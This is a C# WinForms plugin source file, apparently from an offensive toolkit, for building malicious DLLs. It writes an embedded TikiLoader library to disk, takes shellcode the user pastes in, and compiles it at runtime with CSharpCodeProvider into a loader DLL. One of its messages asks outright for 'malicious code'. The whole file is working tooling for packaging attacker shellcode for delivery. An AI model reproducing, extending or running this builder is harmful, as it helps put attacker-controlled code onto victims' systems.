using Microsoft.CSharp;
using PlugInProgram;
using System;
using System.CodeDom.Compiler;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace UcTikiTorch
{
    public partial class Form1 : UserControlBase
    {
        public Form1()
        {
            InitializeComponent();
            ucName = "UcTikiTorch"; // 插件名称
        }

        private void UserControl1_Load(object sender, EventArgs e)
        {
            byte[] byDll = global::UcTikiTorch.Properties.Resources.TikiLoader;  
            string strPath = System.Environment.CurrentDirectory + @"\TikiLoader.dll";
            if (!File.Exists(strPath)) {
                using (FileStream fs = new FileStream(strPath, FileMode.Create))
                {
                    fs.Write(byDll, 0, byDll.Length);
                }
            }
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            saveFileDialog1.Filter = "DLL Library(*.dll)|*.dll";
            DialogResult dialog = saveFileDialog1.ShowDialog();
            if (dialog == DialogResult.OK)
            {
                textBox1.Text = saveFileDialog1.FileName;
            }
        }

        private void richTextBox1_GotFocus(object sender, EventArgs e) {
            if (richTextBox1.Text.Equals("Input Your Shellcode"))
            {
                richTextBox1.Text = "";
            }
        }

        private void richTextBox1_LostFocus(object sender, EventArgs e) {
            if (richTextBox1.Text.Equals("")) {
                richToChange();
            }
        }

        private void richTextBox1_OnCreated(object sender, EventArgs e) {
            richToChange();
        }

        public void richToChange() {
            richTextBox1.Text = "Input Your Shellcode";
            richTextBox1.Select(0, richTextBox1.Text.Length);
            richTextBox1.SelectionColor = Color.FromArgb(125, 125, 125);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (!richTextBox1.Text.Equals("Input Your Shellcode") && !textBox1.Text.Equals(""))
            {
                CreateDll(GetCode.Getcode(richTextBox1.Text,textBox2.Text), textBox1.Text);
            }
            else {
                MessageBox.Show("请输入恶意代码或生成路径！");
            }
        }

        public static void CreateDll(string code,string path) {
            CSharpCodeProvider provider = new CSharpCodeProvider();
            //设置好编译参数
            CompilerParameters paras = new CompilerParameters();
            
            paras.EmbeddedResources.Add(System.Environment.CurrentDirectory + @"\TikiLoader.dll");
            //引用第三方dll
            paras.ReferencedAssemblies.Add(@"System.dll");
            paras.ReferencedAssemblies.Add(System.Environment.CurrentDirectory + @"\TikiLoader.dll");
            //是否内存中生成输出
            paras.GenerateInMemory = false;
            //是否生成可执行文件
            paras.GenerateExecutable = false;
            //选择生成的路径
            paras.OutputAssembly = path;

            CompilerResults cr = provider.CompileAssemblyFromSource(paras, code);
            if (cr.Errors.Count > 0)
            {
                StringBuilder sb = new StringBuilder();
                foreach (var er in cr.Errors)
                    sb.AppendLine(er.ToString());
                MessageBox.Show(sb.ToString());
            }
            else
            {
                MessageBox.Show("编译成功");
            }
        }
    }
}
